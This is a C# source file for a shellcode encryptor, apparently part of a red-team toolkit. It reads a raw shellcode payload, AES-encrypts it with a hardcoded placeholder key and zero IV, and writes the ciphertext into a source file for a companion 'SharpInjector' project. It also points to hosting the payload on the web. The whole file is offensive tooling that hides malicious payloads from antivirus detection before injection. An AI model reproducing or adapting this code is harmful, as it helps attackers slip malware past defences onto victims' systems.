using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;

namespace ScEncryptor
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: EncryptedShellcode.exe <path to shellcode.bin>");
                Environment.Exit(1);
            }

            string PayloadPath = args[0];
            byte[] Shellcode = File.ReadAllBytes(PayloadPath);
            string B64Shellcode = Convert.ToBase64String(Shellcode);
            string EncryptedShellcode = Enc(B64Shellcode);
            WriteShellcodeToFile(EncryptedShellcode);
            Console.WriteLine("[*] Shellcode encrypted within Shellycode.cs!");
            Console.WriteLine("[*] Now build the injector project or remove encrypted shellcode and host it on the web");
        }

        public static string Enc(string data)
        {
            string enc = "";
            string key = "01010101010101010101010101010101"; // CHANGE THIS TO A 16/24/32 BYTE VALUE

            // Check byte key length; exit if not 16, 24, or 32
            if (!(new[] {16,24,32}.Contains(Buffer.ByteLength(Encoding.UTF8.GetBytes(key)))))
            {
                Console.WriteLine("[!] Encryption key must be 16, 24, or 32 bytes long");
                Environment.Exit(1);
            }

            byte[] iv = new byte[16];

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream((Stream)ms, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter((Stream)cs))
                        {
                            sw.Write(data);
                        }

                        byte[] arr = ms.ToArray();
                        enc = Convert.ToBase64String(arr);
                    }
                }
            }

            return enc;
        }

        public static void WriteShellcodeToFile(string EncryptedShellcode)
        {
            string WorkingDir = Environment.CurrentDirectory;
            string ProjectDir = Directory.GetParent(WorkingDir).Parent.FullName;

            string[] lines = {
                "namespace SharpInjector",
                "{",
                "\tclass EncryptedShellcode",
                "\t{",
                $"\t\tpublic string EncSc = \"{EncryptedShellcode}\";",
                "\t}",
                "}"
            };

            File.WriteAllLines($"{ProjectDir}\\..\\SharpInjector\\Shellycode.cs", lines);

        }

    }
}
